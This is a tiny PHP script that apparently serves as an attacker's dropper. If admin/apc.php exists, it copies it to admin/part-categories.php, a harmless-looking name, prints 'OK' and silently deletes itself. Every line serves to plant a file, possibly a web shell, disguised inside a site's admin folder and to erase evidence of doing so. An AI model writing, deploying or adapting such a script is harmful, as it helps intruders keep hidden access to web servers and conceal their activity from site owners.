<?php
if(file_exists(__DIR__.'/admin/apc.php')){copy(__DIR__.'/admin/apc.php',__DIR__.'/admin/part-categories.php');echo'OK';}
@unlink(__FILE__);